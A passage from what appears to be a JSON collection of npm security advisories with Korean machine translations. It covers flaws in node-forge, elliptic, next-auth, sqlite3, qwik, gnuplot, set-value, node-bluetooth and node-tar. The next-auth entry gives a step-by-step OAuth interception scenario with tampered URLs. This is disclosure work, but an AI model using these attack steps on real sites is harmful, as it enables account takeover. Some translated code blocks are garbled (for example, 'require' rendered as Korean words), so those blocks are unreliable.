비교할 때 다음과 같은 방법으로 문제가 해결됩니다.\n\n1. `String.normalize('NFKD')` 메서드는 먼저 모든 유니코드를 최대로 호환되는 다중 코드 포인트 형식으로 정규화하는 데 사용됩니다.\n2. 모든 슬래시는 Windows 시스템에서 `/`로 정규화됩니다(posix 시스템에서 `\\`는 유효한 파일 이름 문자이므로 그대로 남습니다).\n3. Windows 시스템에서 기호 링크가 발견되면 전체 디렉토리 캐시가 지워집니다. 디렉토리를 다른(심볼릭 링크가 아닌) 항목 유형으로 대체하기 위해 8.3 짧은 이름을 사용하는 것과 관련된 충돌로 인해 아카이브가 제대로 추출되지 않을 수 있지만 임의의 파일 쓰기가 발생하지는 않습니다."
  },
  {
    "description": "### Impact\n\nRSA PKCS#1 v1.5 signature verification code is lenient in checking the digest algorithm structure. This can allow a crafted structure that steals padding bytes and uses unchecked portion of the PKCS#1 encoded message to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https://github.com/digitalbazaar/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)",
    "identifiers": "GHSA : GHSA-cfm4-qjh2-4765\nCVE : CVE-2022-24771",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:33:08Z",
    "publishedAt": "2022-03-18T23:09:54Z",
    "references": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-cfm4-qjh2-4765\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-24771\nhttps://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1\nhttps://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2\nhttps://github.com/advisories/GHSA-cfm4-qjh2-4765",
    "name": "node-forge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.0",
    "identifier": "1.3.0",
    "descriptionKR": "### 영향\n\nRSA PKCS#1 v1.5 서명 확인 코드는 다이제스트 알고리즘 구조를 확인하는 데 관대합니다. 이렇게 하면 패딩 바이트를 훔치고 PKCS#1 인코딩 메시지의 확인되지 않은 부분을 사용하여 낮은 공개 지수가 사용될 때 서명을 위조하는 제작된 구조를 허용할 수 있습니다.\n\n### 패치\n\n이 문제는 `node-forge` `1.3.0`에서 해결되었습니다.\n\n### 참조\n\n자세한 내용은 다음을 참조하십시오.\n[\"구현 오류에 따른 Bleichenbacher의 RSA 서명 위조\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\n할 피니.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [forge](https://github.com/digitalbazaar/forge)에서 이슈 열기\n* [예시 이메일 주소](mailto:security@digitalbazaar.com)로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\n\nRSA PKCS#1 v1.5 signature verification code does not check for tailing garbage bytes after decoding a `DigestInfo` ASN.1 structure. This can allow padding bytes to be removed and garbage data added to forge a signature when a low public exponent is being used.\n\n### Patches\n\nThe issue has been addressed in `node-forge` `1.3.0`.\n\n### References\n\nFor more information, please see\n[\"Bleichenbacher's RSA signature forgery based on implementation error\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\nby Hal Finney.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in [forge](https://github.com/digitalbazaar/forge)\n* Email us at [example email address](mailto:security@digitalbazaar.com)",
    "identifiers": "GHSA : GHSA-x4jg-mjrx-434g\nCVE : CVE-2022-24772",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:31:44Z",
    "publishedAt": "2022-03-18T23:10:28Z",
    "references": "https://github.com/digitalbazaar/forge/security/advisories/GHSA-x4jg-mjrx-434g\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-24772\nhttps://github.com/digitalbazaar/forge/commit/3f0b49a0573ef1bb7af7f5673c0cfebf00424df1\nhttps://github.com/digitalbazaar/forge/commit/bb822c02df0b61211836472e29b9790cc541cdb2\nhttps://github.com/advisories/GHSA-x4jg-mjrx-434g",
    "name": "node-forge",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.3.0",
    "identifier": "1.3.0",
    "descriptionKR": "### 영향\n\nRSA PKCS#1 v1.5 서명 확인 코드는 'DigestInfo' ASN.1 구조를 디코딩한 후 테일링 가비지 바이트를 확인하지 않습니다. 이를 통해 패딩 바이트를 제거하고 가비지 데이터를 추가하여 낮은 공개 지수가 사용될 때 서명을 위조할 수 있습니다.\n\n### 패치\n\n이 문제는 `node-forge` `1.3.0`에서 해결되었습니다.\n\n### 참조\n\n자세한 내용은 다음을 참조하십시오.\n[\"구현 오류에 따른 Bleichenbacher의 RSA 서명 위조\"](https://mailarchive.ietf.org/arch/msg/openpgp/5rnE9ZRN1AokBVj3VqblGlP63QE/)\n할 피니.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [forge](https://github.com/digitalbazaar/forge)에서 이슈 열기\n* [예시 이메일 주소](mailto:security@digitalbazaar.com)로 이메일을 보내주세요."
  },
  {
    "description": "The Elliptic package before version 6.5.3 for Node.js allows ECDSA signature malleability via variations in encoding, leading '\\0' bytes, or integer overflows. This could conceivably have a security-relevant impact if an application relied on a single canonical signature.",
    "identifiers": "GHSA : GHSA-vh7m-p724-62c2\nCVE : CVE-2020-13822",
    "severity": "HIGH",
    "updatedAt": "2023-03-13T21:25:19Z",
    "publishedAt": "2020-07-29T20:40:35Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2020-13822\nhttps://github.com/indutny/elliptic/issues/226\nhttps://medium.com/@herman_10687/malleability-attack-why-it-matters-7b5f59fb99a4\nhttps://www.npmjs.com/package/elliptic\nhttps://yondon.blog/2019/01/01/how-not-to-use-ecdsa/\nhttps://github.com/indutny/elliptic/commit/856fe4d99fe7b6200556e6400b3bf585b1721bec\nhttps://github.com/advisories/GHSA-vh7m-p724-62c2",
    "name": "elliptic",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 6.5.3",
    "identifier": "6.5.3",
    "descriptionKR": "Node.js용 버전 6.5.3 이전의 Elliptic 패키지는 인코딩의 변형, 선행 '\\0' 바이트 또는 정수 오버플로를 통해 ECDSA 서명 가단성을 허용합니다. 애플리케이션이 단일 정식 서명에 의존하는 경우 이는 보안 관련 영향을 미칠 수 있습니다."
  },
  {
    "description": "### Impact\n`next-auth` applications using OAuth provider versions before `v4.20.1` are affected.\n\nA bad actor who can spy on the victim's network or able to social engineer the victim to click a manipulated login link could intercept and tamper with the authorization URL to **log in as the victim**, bypassing the CSRF protection.\n\nAs an example, an attack can happen in the following scenario. \n\n> TL;DR: The attacker steals the victim's authenticated callback by intercepting and tampering with the authorization URL created by `next-auth`.\n\n1. The victim attempts to log in to the `next-auth` site. For example https://next-auth-example.vercel.app/\n2. `next-auth` sets the `checks` cookies according to how the OAuth provider is configured. In this case, `state` and `pkce` are set by default for the Google Provider.\n<img width=\"1971\" alt=\"Screen Shot 2023-03-03 at 09 54 26\" src=\"https://user-images.githubusercontent.com/31528554/222619750-a2062bb8-99eb-4985-a75c-d75acd3da67e.png\">\n\n3. The attacker intercepts the returned authorization URL, strips away the OAuth check (nonce, state, pkce), and returns the URL _without_ the check to the victim's browser. For example:\nFrom \n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app%2Fapi%2Fauth%2Fcallback%2Fgoogle&state=state&code_challenge=code_challenge&code_challenge_method=S256&service=lso&o2v=2&flowName=GeneralOAuthFlow```\nto\n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app%2Fapi%2Fauth%2Fcallback%2Fgoogle&service=lso&o2v=2&flowName=GeneralOAuthFlow```.\nNotice the parameters `state`, `code_challenge` and `code_verifier` are removed from the victim's address bar.\n\n4. The victim attempts to log in using their OAuth account.\n\n5. The Authorization Server logs the victim in and calls back to the `next-auth` `api/auth/callback/:providerId`endpoint. \n5.1. The attacker intercepts and logs this callback URL for later use.\n5.2. `next-auth` checks the callback call from OAuth Authorization Server (doesn't have checks) and compares the checks with the cookies set (has checks) at step 2. This check will fail, resulting in the victim isn't logged in. However, at this step, the Authorization Server has already accepted the victim's request to log in and generated/sent a `code` in the URL.\n6. The attacker now has an authorization URL with the `code` that the AS will exchange for valid `access_token`/`id_token` and can log in as the victim automatically. They can open a new browser window and paste in the URL logged at step 5.1 and log in as the victim.\n\n\n### Patches\nWe patched the vulnerability in `next-auth` `v4.20.1` \nTo upgrade, run one of the following:\n```\nnpm i next-auth@latest\n```\n```\nyarn add next-auth@latest\n```\n```\npnpm add next-auth@latest\n```\n\n### Workarounds\n\nUpgrading to `latest` is the recommended way to fix this issue. However, using [Advanced Initialization](https://next-auth.js.org/configuration/initialization#advanced-initialization), developers can manually check the [callback request](https://next-auth.js.org/getting-started/rest-api#getpost-apiauthcallbackprovider) for `state`, `pkce`, and `nonce` against the provider configuration, and abort the sign-in process if there is a mismatch. Check out the [source code](https://github.com/nextauthjs/next-auth/blob/v4/packages/next-auth/src/core/lib/oauth/checks.ts) for help.\n\n### References\n- [CSRF](https://www.rfc-editor.org/rfc/rfc6749#section-10.12)\n- [PKCE vs nonce](https://danielfett.de/2020/05/16/pkce-vs-nonce-equivalent-or-not/)\n- [OAuth provider options](https://next-auth.js.org/configuration/providers/oauth)\n- [`checks` provider config](https://authjs.dev/reference/core/providers#checks)",
    "identifiers": "GHSA : GHSA-7r7x-4c4q-c4qf\nCVE : CVE-2023-27490",
    "severity": "HIGH",
    "updatedAt": "2023-04-20T14:23:36Z",
    "publishedAt": "2023-03-13T20:52:50Z",
    "references": "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-7r7x-4c4q-c4qf\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27490\nhttps://authjs.dev/reference/core/providers#checks\nhttps://danielfett.de/2020/05/16/pkce-vs-nonce-equivalent-or-not/\nhttps://github.com/nextauthjs/next-auth/compare/next-auth@4.20.0...next-auth@4.20.1#diff-cf9257195d0cb6a835ae4ff1fc73fe2cac0bab847efb0832c1f551209a972b47R55\nhttps://next-auth.js.org/configuration/initialization#advanced-initialization\nhttps://next-auth.js.org/configuration/providers/oauth\nhttps://www.rfc-editor.org/rfc/rfc6749#section-10.12\nhttps://security.netapp.com/advisory/ntap-20230420-0006/\nhttps://github.com/advisories/GHSA-7r7x-4c4q-c4qf",
    "name": "next-auth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.20.1",
    "identifier": "4.20.1",
    "descriptionKR": "### 영향\n`v4.20.1` 이전의 OAuth 공급자 버전을 사용하는 `next-auth` 애플리케이션이 영향을 받습니다.\n\n피해자의 네트워크를 염탐하거나 피해자가 조작된 로그인 링크를 클릭하도록 사회 공학을 수행할 수 있는 악의적인 행위자는 CSRF 보호를 우회하여 **피해자로 로그인**하도록 권한 부여 URL을 가로채고 변조할 수 있습니다.\n\n예를 들어 다음과 같은 시나리오에서 공격이 발생할 수 있습니다.\n\n> 요약: 공격자는 `next-auth`에 의해 생성된 인증 URL을 가로채고 변조하여 피해자의 인증된 콜백을 훔칩니다.\n\n1. 피해자는 `next-auth` 사이트에 로그인을 시도합니다. 예를 들어 https://next-auth-example.vercel.app/\n2. `next-auth`는 OAuth 공급자가 구성된 방식에 따라 `checks` 쿠키를 설정합니다. 이 경우 Google Provider에 대해 `state` 및 `pkce`가 기본적으로 설정됩니다.\n<img width=\"1971\" alt=\"스크린샷 2023-03-03 at 09 54 26\" src=\"https://user-images.githubusercontent.com/31528554/222619750-a2062bb8-99eb-4985-a75c-d75acd3da67e .png\">\n\n3. 공격자는 반환된 인증 URL을 가로채고 OAuth 검사(nonce, state, pkce)를 제거하고 검사가 없는 URL을 피해자의 브라우저에 반환합니다. 예를 들어:\n에서\n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app %2Fapi%2Fauth%2Fcallback%2Fgoogle&state=state&code_challenge=code_challenge&code_challenge_method=S256&service=lso&o2v=2&flowName=GeneralOAuthFlow```\n에게\n```https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=client_id&scope=openid%20email%20profile&response_type=code&redirect_uri=https%3A%2F%2Fnext-auth-example.vercel.app %2Fapi%2Fauth%2Fcallback%2Fgoogle&service=lso&o2v=2&flowName=GeneralOAuthFlow```.\n`state`, `code_challenge` 및 `code_verifier` 매개변수가 피해자의 주소 표시줄에서 제거됩니다.\n\n4. 피해자는 OAuth 계정을 사용하여 로그인을 시도합니다.\n\n5. 인증 서버는 피해자를 로그인하고 `next-auth` `api/auth/callback/:providerId`endpoint로 콜백합니다.\n5.1. 공격자는 나중에 사용할 수 있도록 이 콜백 URL을 가로채서 기록합니다.\n5.2. `next-auth`는 OAuth Authorization Server의 콜백 호출(확인 없음)을 확인하고 확인을 2단계에서 설정된 쿠키(확인 있음)와 비교합니다. 이 확인은 실패하여 피해자가 로그인하지 않습니다. 그러나 이 단계에서 Authorization Server는 이미 피해자의 로그인 요청을 수락하고 URL에 '코드'를 생성/전송했습니다.\n6. 이제 공격자는 AS가 유효한 `access_token`/`id_token`으로 교환할 `code`가 포함된 인증 URL을 가지고 있으며 피해자로 자동 로그인할 수 있습니다. 그들은 새 브라우저 창을 열고 5.1단계에서 기록된 URL을 붙여넣고 피해자로 로그인할 수 있습니다.\n\n\n### 패치\n`next-auth` `v4.20.1`의 취약점을 패치했습니다.\n업그레이드하려면 다음 중 하나를 실행하십시오.\n```\nnpm i next-auth@latest\n```\n```\n원사 추가 next-auth@latest\n```\n```\npnpm add next-auth@latest\n```\n\n### 해결 방법\n\n이 문제를 해결하려면 '최신'으로 업그레이드하는 것이 좋습니다. 그러나 [고급 초기화](https://next-auth.js.org/configuration/initialization#advanced-initialization)를 사용하면 개발자가 [콜백 요청](https://next-auth.js.org)을 수동으로 확인할 수 있습니다. /getting-started/rest-api#getpost-apiauthcallbackprovider) 제공자 구성에 대한 `state`, `pkce` 및 `nonce`에 대해, 불일치가 있는 경우 로그인 프로세스를 중단합니다. [소스 코드](https://github.com/nextauthjs/next-auth/blob/v4/packages/next-auth/src/core/lib/oauth/checks.ts)에서 도움말을 확인하세요.\n\n### 참조\n- [CSRF](https://www.rfc-editor.org/rfc/rfc6749#section-10.12)\n- [PKCE vs nonce](https://danielfett.de/2020/05/16/pkce-vs-nonce-equivalent-or-not/)\n- [OAuth 공급자 옵션](https://next-auth.js.org/configuration/providers/oauth)\n- [`checks` 공급자 구성](https://authjs.dev/reference/core/providers#checks)"
  },
  {
    "description": "### Impact\n\nDue to the underlying implementation of `.ToString()`, it's possible to execute arbitrary JavaScript, or to achieve a denial-of-service, if a binding parameter is a crafted Object.\n\nUsers of `sqlite3` v5.0.0 - v5.1.4 are affected by this.\n\n### Patches\n\nFixed in v5.1.5. All users are recommended to upgrade to v5.1.5 or later.\n\n### Workarounds\n\n* Ensure there is sufficient sanitization in the parent application to protect against invalid values being supplied to binding parameters.\n\n### References\n\n* Commit: https://github.com/TryGhost/node-sqlite3/commit/edb1934dd222ae55632e120d8f64552d5191c781\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Email us at [security@ghost.org](mailto:security@ghost.org)\n\nCredits: Dave McDaniel of Cisco Talos",
    "identifiers": "GHSA : GHSA-jqv5-7xpx-qj74\nCVE : CVE-2022-43441",
    "severity": "HIGH",
    "updatedAt": "2023-03-22T21:40:39Z",
    "publishedAt": "2023-03-13T20:00:52Z",
    "references": "https://github.com/TryGhost/node-sqlite3/security/advisories/GHSA-jqv5-7xpx-qj74\nhttps://github.com/TryGhost/node-sqlite3/commit/edb1934dd222ae55632e120d8f64552d5191c781\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-43441\nhttps://talosintelligence.com/vulnerability_reports/TALOS-2022-1645\nhttps://github.com/advisories/GHSA-jqv5-7xpx-qj74",
    "name": "sqlite3",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.1.5",
    "identifier": "5.1.5",
    "descriptionKR": "### 영향\n\n`.ToString()`의 기본 구현으로 인해 바인딩 매개변수가 제작된 객체인 경우 임의의 JavaScript를 실행하거나 서비스 거부를 달성할 수 있습니다.\n\n`sqlite3` v5.0.0 - v5.1.4 사용자가 이에 영향을 받습니다.\n\n### 패치\n\nv5.1.5에서 수정되었습니다. 모든 사용자는 v5.1.5 이상으로 업그레이드하는 것이 좋습니다.\n\n### 해결 방법\n\n* 바인딩 매개변수에 유효하지 않은 값이 제공되는 것을 방지하기 위해 상위 애플리케이션에 충분한 정리가 있는지 확인하십시오.\n\n### 참조\n\n* 커밋: https://github.com/TryGhost/node-sqlite3/commit/edb1934dd222ae55632e120d8f64552d5191c781\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요.\n\n크레딧: Cisco Talos의 Dave McDaniel"
  },
  {
    "description": "Code Injection in GitHub repository builderio/qwik prior to 0.21.0. The Function deserializer can be accessed using the pureServerFunction feature. This allows any Javascript code to be run by node.js.",
    "identifiers": "GHSA : GHSA-9wf9-qvvp-2929\nCVE : CVE-2023-1283",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-14T21:35:03Z",
    "publishedAt": "2023-03-09T00:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-1283\nhttps://github.com/builderio/qwik/commit/4d9ba6e098ae6e537aa55abb6b8369bb670ffe66\nhttps://huntr.dev/bounties/63f1ff91-48f3-4886-a179-103f1ddd8ff8\nhttps://github.com/advisories/GHSA-9wf9-qvvp-2929",
    "name": "@builder.io/qwik",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.21.0",
    "identifier": "0.21.0",
    "descriptionKR": "0.21.0 이전의 GitHub 리포지토리 builderio/qwik에 코드 삽입. Function deserializer는 pureServerFunction 기능을 사용하여 액세스할 수 있습니다. 이를 통해 모든 Javascript 코드를 node.js에서 실행할 수 있습니다."
  },
  {
    "description": "An issue found in Stoqey gnuplot v.0.0.3 and earlier allows attackers to execute arbitrary code via the src/index.ts, plotCallack, child_process, and/or filePath parameter(s).",
    "identifiers": "GHSA : GHSA-795w-7426-m94j\nCVE : CVE-2021-33360",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-15T19:18:27Z",
    "publishedAt": "2023-03-10T18:30:22Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-33360\nhttps://advisory.checkmarx.net/advisory/CX-2021-4811/\nhttps://github.com/stoqey/gnuplot/blob/cd76060a15f58348baeef1c5fd867ce856515949/src/index.ts#L211-L217\nhttps://github.com/advisories/GHSA-795w-7426-m94j",
    "name": "@stoqey/gnuplot",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 0.0.3",
    "descriptionKR": "Stoqey gnuplot v.0.0.3 및 이전 버전에서 발견된 문제로 인해 공격자는 src/index.ts, plotCallack, child_process 및/또는 filePath 매개 변수를 통해 임의의 코드를 실행할 수 있습니다."
  },
  {
    "description": "This affects the package `set-value` before 2.0.1, and starting with 3.0.0 but prior to 4.0.1. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the path parameter are arrays.",
    "identifiers": "GHSA : GHSA-4jqc-8m5r-9rpr\nCVE : CVE-2021-23440",
    "severity": "HIGH",
    "updatedAt": "2023-03-10T05:05:42Z",
    "publishedAt": "2021-09-13T20:09:36Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2021-23440\nhttps://github.com/jonschlinkert/set-value/pull/33\nhttps://github.com/jonschlinkert/set-value/commit/7cf8073bb06bf0c15e08475f9f952823b4576452\nhttps://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1584212\nhttps://snyk.io/vuln/SNYK-JS-SETVALUE-1540541\nhttps://www.huntr.dev/bounties/2eae1159-01de-4f82-a177-7478a408c4a2/\nhttps://www.oracle.com/security-alerts/cpujan2022.html\nhttps://github.com/jonschlinkert/set-value/pull/33/commits/383b72d47c74a55ae8b6e231da548f9280a4296a\nhttps://github.com/jonschlinkert/set-value/commit/cb12f14955dde6e61829d70d1851bfea6a3c31ad\nhttps://github.com/advisories/GHSA-4jqc-8m5r-9rpr",
    "name": "set-value",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 4.0.1",
    "identifier": "4.0.1",
    "descriptionKR": "이것은 2.0.1 이전의 패키지 `set-value`에 영향을 미치며 3.0.0부터 4.0.1 이전까지 영향을 미칩니다. 경로 매개변수에 사용된 사용자 제공 키가 배열인 경우 유형 혼동 취약성으로 인해 CVE-2019-10747을 우회할 수 있습니다."
  },
  {
    "description": "All versions of the package node-bluetooth are vulnerable to Buffer Overflow via the findSerialPortChannel method due to improper user input length validation.",
    "identifiers": "GHSA : GHSA-cxx3-36qc-m6qm\nCVE : CVE-2023-26110",
    "severity": "CRITICAL",
    "updatedAt": "2023-03-15T19:16:24Z",
    "publishedAt": "2023-03-09T06:30:21Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2023-26110\nhttps://security.snyk.io/vuln/SNYK-JS-NODEBLUETOOTH-3311821\nhttps://github.com/advisories/GHSA-cxx3-36qc-m6qm",
    "name": "node-bluetooth",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "<= 1.2.6",
    "descriptionKR": "node-bluetooth 패키지의 모든 버전은 부적절한 사용자 입력 길이 유효성 검사로 인해 findSerialPortChannel 메서드를 통한 버퍼 오버플로에 취약합니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThis issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.\n\n### Patches\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",
    "identifiers": "GHSA : GHSA-r628-mhmh-qjhw\nCVE : CVE-2021-32803",
    "severity": "HIGH",
    "updatedAt": "2023-03-09T16:44:58Z",
    "publishedAt": "2021-08-03T19:00:40Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw\nhttps://github.com/npm/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://www.npmjs.com/advisories/1771\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-32803\nhttps://www.npmjs.com/package/tar\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/46fe35083e2676e31c4e0a81639dce6da7aaa356\nhttps://github.com/isaacs/node-tar/commit/5987d9a41f6bfbf1ddab1098e1fdcf1a5618f571\nhttps://github.com/isaacs/node-tar/commit/85d3a942b4064e4ff171f91696fced7975167349\nhttps://github.com/isaacs/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://github.com/advisories/GHSA-r628-mhmh-qjhw",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 6.0.0, < 6.1.2",
    "identifier": "6.1.2",
    "descriptionKR": "### 영향\n\n임의 파일 생성, 임의 파일 덮어쓰기, 임의 코드 실행\n\n`node-tar`는 심볼릭 링크에 의해 위치가 수정되는 파일이 추출되지 않도록 보장하는 것을 목표로 합니다. 이것은 부분적으로 추출된 디렉토리가 심볼릭 링크가 아닌지 확인함으로써 달성됩니다. 또한 주어진 경로가 디렉토리인지 여부를 확인하기 위한 불필요한 `stat` 호출을 방지하기 위해 디렉토리가 생성될 때 경로가 캐시됩니다.\n\n이 논리는 디렉터리와 디렉터리와 이름이 같은 심볼릭 링크가 모두 포함된 tar 파일을 추출할 때 충분하지 않았습니다. 이 작업 순서로 인해 디렉토리가 생성되고 `node-tar` 디렉토리 캐시에 추가됩니다. 디렉터리 캐시에 디렉터리가 있으면 해당 디렉터리에 대한 mkdir에 대한 후속 호출을 건너뜁니다. 그러나 이것은 `node-tar`가 심볼릭 링크를 확인하는 곳이기도 합니다.\n\n먼저 디렉토리를 생성한 다음 해당 디렉토리를 심볼릭 링크로 대체함으로써 디렉토리에 대한 `node-tar` 심볼릭 링크 검사를 우회할 수 있었으며 기본적으로 신뢰할 수 없는 tar 파일이 임의의 위치로 심볼릭 링크되고 이후 임의의 파일을 해당 위치로 추출할 수 있었습니다. 따라서 임의의 파일 생성 및 덮어쓰기가 가능합니다.\n\n이 문제는 릴리스 3.2.3, 4.4.15, 5.0.7 및 6.1.2에서 해결되었습니다.\n\n### 패치\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### 해결 방법\n\n사용자는 심볼릭 링크 추출을 방지하는 사용자 지정 '필터' 메서드를 생성하여 업그레이드하지 않고도 이 취약점을 해결할 수 있습니다.\n\n```js\nconst tar = 요구('타르')\n\ntar.x({\n  파일: 'archive.tgz',\n  필터: (파일, 항목) => {\n    if (entry.type === 'SymbolicLink') {\n      거짓 반환\n    } 또 다른 {\n      참을 반환\n    }\n  }\n})\n```\n\n사용자는 tar 입력 자체를 삭제하려고 시도하기보다는 최신 패치 버전으로 업그레이드하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nArbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution\n\n`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.\n\nThis logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.\n\nBy first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.\n\nThis issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.\n\n### Patches\n\n3.2.3 || 4.4.15 || 5.0.7 || 6.1.2\n\n### Workarounds\n\nUsers may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.\n\n```js\nconst tar = require('tar')\n\ntar.x({\n  file: 'archive.tgz',\n  filter: (file, entry) => {\n    if (entry.type === 'SymbolicLink') {\n      return false\n    } else {\n      return true\n    }\n  }\n})\n```\n\nUsers are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.",
    "identifiers": "GHSA : GHSA-r628-mhmh-qjhw\nCVE : CVE-2021-32803",
    "severity": "HIGH",
    "updatedAt": "2023-03-09T16:44:58Z",
    "publishedAt": "2021-08-03T19:00:40Z",
    "references": "https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw\nhttps://github.com/npm/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://www.npmjs.com/advisories/1771\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-32803\nhttps://www.npmjs.com/package/tar\nhttps://www.oracle.com/security-alerts/cpuoct2021.html\nhttps://cert-portal.siemens.com/productcert/pdf/ssa-389290.pdf\nhttps://github.com/isaacs/node-tar/commit/46fe35083e2676e31c4e0a81639dce6da7aaa356\nhttps://github.com/isaacs/node-tar/commit/5987d9a41f6bfbf1ddab1098e1fdcf1a5618f571\nhttps://github.com/isaacs/node-tar/commit/85d3a942b4064e4ff171f91696fced7975167349\nhttps://github.com/isaacs/node-tar/commit/9dbdeb6df8e9dbd96fa9e84341b9d74734be6c20\nhttps://github.com/advisories/GHSA-r628-mhmh-qjhw",
    "name": "tar",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.0.7",
    "identifier": "5.0.7",
